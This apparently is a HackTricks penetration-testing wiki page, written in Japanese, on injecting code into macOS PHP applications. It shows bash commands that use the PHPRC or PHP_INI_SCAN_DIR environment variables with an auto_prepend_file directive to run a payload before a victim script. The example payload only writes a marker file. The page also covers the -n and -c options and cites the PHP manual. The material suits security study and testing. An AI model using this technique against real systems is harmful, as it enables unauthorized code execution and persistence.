# macOS PHP Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` と `auto_prepend_file`

PHP CLI と CGI は、呼び出されるたびに設定を読み込みます。`PHPRC` では攻撃者が読み取り可能な `php.ini` を選択でき、`PHP_INI_SCAN_DIR` では追加の `.ini` ファイルをスキャンするディレクトリを変更できます。`auto_prepend_file` ディレクティブにより、PHP は要求されたスクリプトの前にファイルを解析するため、この組み合わせによって起動時のコード実行が可能になります。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
別の方法として、`.ini` ファイルを含むディレクトリがあります：
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
`-n` オプションは `php.ini` を無視します。明示的に指定された信頼済みの `-c` パスは `PHPRC` より優先されます。長時間稼働する server SAPI は通常、web server の起動時に設定を読み込む一方、CLI と CGI は呼び出しごとに読み込むことに注意してください。<sup>[[1]](#references)</sup>

## References

- [1] [PHP 設定ファイル](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
